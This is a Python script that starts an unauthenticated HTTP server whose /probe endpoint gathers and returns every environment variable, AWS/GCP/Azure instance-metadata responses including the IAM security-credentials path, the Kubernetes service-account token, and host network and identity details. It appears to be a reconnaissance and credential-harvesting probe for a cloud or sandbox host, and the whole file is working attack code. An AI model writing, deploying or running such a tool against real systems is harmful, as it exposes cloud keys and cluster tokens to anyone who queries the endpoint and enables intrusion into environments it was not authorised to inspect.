import os, socket, urllib.request, json, subprocess, time

def get(url, headers=None, timeout=4, method="GET", data=None):
    try:
        req=urllib.request.Request(url, headers=headers or {}, method=method, data=data)
        r=urllib.request.urlopen(req, timeout=timeout)
        return {"status": r.status, "body": r.read().decode(errors="replace")[:3000]}
    except Exception as e:
        return {"error": str(e)[:300]}

def run(cmd, timeout=10):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout).stdout[:3000] or subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout).stderr[:1000]
    except Exception as e:
        return f"err: {e}"

def collect():
    out={}
    out["hostname"]=socket.gethostname()
    out["env"]={k:v for k,v in os.environ.items()}
    # AWS IMDSv2 then v1
    tok=get("http://169.254.169.254/latest/api/token", headers={"X-aws-ec2-metadata-token-ttl-seconds":"60"}, method="PUT")
    out["aws_imdsv2_token"]=tok
    h={}
    if isinstance(tok,dict) and tok.get("status")==200:
        h={"X-aws-ec2-metadata-token":tok["body"]}
    out["aws_imds_root"]=get("http://169.254.169.254/latest/meta-data/", headers=h)
    if not h:
        out["aws_imdsv1_root"]=get("http://169.254.169.254/latest/meta-data/")
    out["aws_imds_iam"]=get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", headers=h)
    out["gcp_metadata"]=get("http://169.254.169.254/computeMetadata/v1/", headers={"Metadata-Flavor":"Google"})
    out["gcp_metadata2"]=get("http://metadata.google.internal/computeMetadata/v1/", headers={"Metadata-Flavor":"Google"})
    out["azure_imds"]=get("http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers={"Metadata":"true"})
    out["k8s_sa_token"]=run("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 400; echo; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null")
    out["k8s_api"]=get("https://kubernetes.default.svc/api", timeout=5)
    out["etc_hosts"]=run("cat /etc/hosts")
    out["resolv"]=run("cat /etc/resolv.conf")
    out["routes"]=run("ip route 2>/dev/null || netstat -rn 2>/dev/null")
    out["ifconfig"]=run("ip addr 2>/dev/null | head -40")
    out["id"]=run("id; uname -a; cat /proc/1/cgroup 2>/dev/null | head -5")
    out["proc_net"]=run("cat /proc/net/arp 2>/dev/null | head -20")
    return out

from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/probe"):
            data=json.dumps(collect(), default=str).encode()
            self.send_response(200); self.send_header("content-type","application/json"); self.end_headers(); self.wfile.write(data)
        else:
            b=b"ok"
            self.send_response(200); self.end_headers(); self.wfile.write(b)
    def log_message(self,*a): pass

port=int(os.environ.get("PORT","10000"))
print("listening on",port,flush=True)
HTTPServer(("0.0.0.0",port),H).serve_forever()
